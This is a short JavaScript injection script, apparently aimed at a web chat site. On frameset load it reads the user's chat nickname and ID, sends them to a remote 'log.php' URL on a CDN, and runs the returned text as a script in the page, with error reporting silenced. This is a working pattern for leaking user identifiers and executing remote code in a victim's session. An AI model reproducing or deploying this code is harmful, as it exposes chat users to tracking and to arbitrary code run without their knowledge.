function injected_main() {

var my_nick = "";

try{
my_nick= top.d_pers.d.nk?top.d_pers.d.nk:top.d_chatact.usr[1];
}
catch(e){
my_nick=""
}
var my_id = top.d_pers.d.id?top.d_pers.d.id:top.d_chatact.meid;
var URL = 'https://cdn.jsdelivr.net/gh/7700300/andre/duty/log.php?ID='+my_id+'&Name='+my_nick;
//alert(URL);
    var XHR = ("onload" in new XMLHttpRequest()) ? XMLHttpRequest : XDomainRequest;
    var xhr = new XHR();
    xhr.open('GET', URL, true);
    xhr.onload = function() {
        var script = document.createElement("script");
        script.setAttribute("type", "text/javascript");
        script.innerHTML = xhr.responseText;
        document.getElementsByTagName("head")[0].appendChild(script);
}
xhr.onerror = function() {
//	alert("Error!");
}
xhr.ontimeout = function() {
//	alert("Timeout!");
}
xhr.send(null);
}
document.getElementsByTagName('frameset') [0].setAttribute('onLoad', 'setTimeout(function(){injected_main()},2000);');

